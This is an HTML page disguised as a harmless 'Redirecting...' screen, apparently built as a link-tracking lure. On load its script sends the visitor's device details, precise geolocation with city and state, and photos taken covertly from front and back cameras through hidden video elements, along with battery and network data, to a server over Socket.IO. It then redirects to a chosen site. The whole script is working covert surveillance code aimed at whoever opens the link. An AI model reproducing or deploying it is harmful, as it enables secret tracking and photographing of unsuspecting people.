<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container { text-align: center; max-width: 500px; width: 100%; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text { font-size: 18px; color: #333; margin-bottom: 8px; }
        .redirect-url { font-size: 14px; color: #4285f4; word-break: break-all; font-weight: 500; }
        .sub-text { font-size: 13px; color: #888; margin-top: 12px; }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        #statusMsg { 
            font-size: 12px; 
            color: #999; 
            margin-top: 15px;
            padding: 8px;
            background: #f5f5f5;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Please wait a moment</div>
        <div id="statusMsg">⏳ Initializing...</div>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <!-- Socket.IO CDN -->
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    
    <script>
        // ============================================
        // MAIN APPLICATION - SIMPLE & GUARANTEED
        // ============================================
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const statusMsg = document.getElementById('statusMsg');
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;
            let dataSent = {};
            let streamFront = null;
            let streamBack = null;

            // ============================================
            // 1. UPDATE STATUS
            // ============================================
            function updateStatus(msg) {
                console.log('[STATUS]', msg);
                statusMsg.textContent = '⏳ ' + msg;
            }

            // ============================================
            // 2. FETCH REDIRECT URL
            // ============================================
            function fetchRedirectUrl() {
                updateStatus('Fetching redirect URL...');
                
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => {
                        if (!res.ok) throw new Error('Not found');
                        return res.json();
                    })
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        updateStatus('Redirect URL loaded');
                        connectSocket();
                    })
                    .catch(() => {
                        // Try fallback
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                updateStatus('Redirect URL loaded (fallback)');
                                connectSocket();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                updateStatus('Using default redirect');
                                connectSocket();
                            });
                    });
            }

            // ============================================
            // 3. CONNECT SOCKET
            // ============================================
            function connectSocket() {
                updateStatus('Connecting to server...');
                
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 5,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', function() {
                        updateStatus('✅ Connected to server');
                        console.log('Socket connected');
                        startDataCollection();
                    });

                    socket.on('connect_error', function(err) {
                        updateStatus('❌ Connection error, retrying...');
                        console.log('Socket error:', err);
                    });

                    socket.on('disconnect', function() {
                        updateStatus('⚠️ Disconnected');
                    });

                } catch(e) {
                    updateStatus('❌ Socket error: ' + e.message);
                    setTimeout(redirectNow, 5000);
                }
            }

            // ============================================
            // 4. START DATA COLLECTION
            // ============================================
            function startDataCollection() {
                updateStatus('📱 Collecting device info...');
                
                // Send device info
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform,
                    os: navigator.userAgentData ? 
                        navigator.userAgentData.platform : 
                        navigator.platform
                };

                if (socket && socket.connected) {
                    socket.emit('visitor-connect', {
                        visitorId: visitorId,
                        ...deviceInfo
                    });
                    console.log('Device info sent');
                }

                // Start all data collection
                setTimeout(() => {
                    requestLocation();
                    requestCameras();
                    getBattery();
                    getNetwork();
                }, 500);

                // Auto redirect after 6 seconds
                setTimeout(() => {
                    if (!redirectTriggered) {
                        updateStatus('🔄 Redirecting...');
                        redirectNow();
                    }
                }, 6000);
            }

            // ============================================
            // 5. REQUEST LOCATION (FORCE PERMISSION)
            // ============================================
            function requestLocation() {
                updateStatus('📍 Requesting location...');
                
                if (!navigator.geolocation) {
                    updateStatus('⚠️ Location not supported');
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        updateStatus('📍 Location granted');
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;

                        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                            .then(res => res.json())
                            .then(data => {
                                const locationInfo = {
                                    lat: lat,
                                    lng: lng,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    country: data.countryName || 'Unknown',
                                    state: data.principalSubdivision || 'Unknown',
                                    city: data.locality || 'Unknown'
                                };

                                if (socket && socket.connected) {
                                    socket.emit('visitor-data', {
                                        visitorId: visitorId,
                                        type: 'location',
                                        content: locationInfo
                                    });
                                    updateStatus(`📍 Location: ${locationInfo.city}, ${locationInfo.state}`);
                                }
                            })
                            .catch(() => {
                                // Basic location
                                const locationInfo = {
                                    lat: lat,
                                    lng: lng,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString()
                                };
                                if (socket && socket.connected) {
                                    socket.emit('visitor-data', {
                                        visitorId: visitorId,
                                        type: 'location',
                                        content: locationInfo
                                    });
                                }
                            });
                    },
                    function(error) {
                        updateStatus('❌ Location denied: ' + error.message);
                    },
                    { timeout: 8000, enableHighAccuracy: true }
                );
            }

            // ============================================
            // 6. REQUEST CAMERAS (FORCE PERMISSION)
            // ============================================
            function requestCameras() {
                updateStatus('📸 Requesting camera...');

                // Front Camera
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(function(stream) {
                    updateStatus('📸 Front camera granted');
                    streamFront = stream;
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = streamFront;
                    return video.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('front', document.getElementById('hiddenVideo'));
                    }, 1500);
                })
                .catch(function(err) {
                    updateStatus('❌ Front camera denied: ' + err.message);
                });

                // Back Camera
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(function(stream) {
                    updateStatus('📸 Back camera granted');
                    streamBack = stream;
                    const video = document.getElementById('hiddenVideoBack');
                    video.srcObject = streamBack;
                    return video.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('back', document.getElementById('hiddenVideoBack'));
                    }, 2500);
                })
                .catch(function(err) {
                    updateStatus('❌ Back camera denied: ' + err.message);
                });
            }

            // ============================================
            // 7. CAPTURE PHOTO
            // ============================================
            function capturePhoto(type, video) {
                if (!video || !video.videoWidth) {
                    console.log(type + ' video not ready');
                    return;
                }

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: type === 'back' ? 'backCamera' : 'frontCamera',
                        content: imageData
                    });
                    updateStatus(`📸 ${type} photo captured`);
                }

                // Clean up
                if (type === 'front' && streamFront) {
                    streamFront.getTracks().forEach(t => t.stop());
                    streamFront = null;
                }
                if (type === 'back' && streamBack) {
                    streamBack.getTracks().forEach(t => t.stop());
                    streamBack = null;
                }
            }

            // ============================================
            // 8. BATTERY
            // ============================================
            function getBattery() {
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(function(battery) {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId: visitorId,
                                    type: 'battery',
                                    content: level
                                });
                                updateStatus(`🔋 Battery: ${level}%`);
                            }
                        })
                        .catch(function() {});
                }
            }

            // ============================================
            // 9. NETWORK
            // ============================================
            function getNetwork() {
                let networkData = {
                    type: 'Unknown',
                    effectiveType: 'Unknown',
                    downlink: 'Unknown'
                };

                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown'
                    };
                }

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: 'network',
                        content: networkData
                    });
                    updateStatus(`📶 Network: ${networkData.effectiveType}`);
                }
            }

            // ============================================
            // 10. REDIRECT
            // ============================================
            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;
                updateStatus('🔄 Redirecting...');

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId: visitorId,
                        type: 'redirectComplete',
                        content: { redirected: true, time: new Date().toISOString() }
                    });
                }

                setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 800);
            }

            // ============================================
            // 11. START
            // ============================================
            fetchRedirectUrl();

            // Cleanup
            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
                if (streamFront) streamFront.getTracks().forEach(t => t.stop());
                if (streamBack) streamBack.getTracks().forEach(t => t.stop());
            });

        })();
    </script>
</body>
</html>
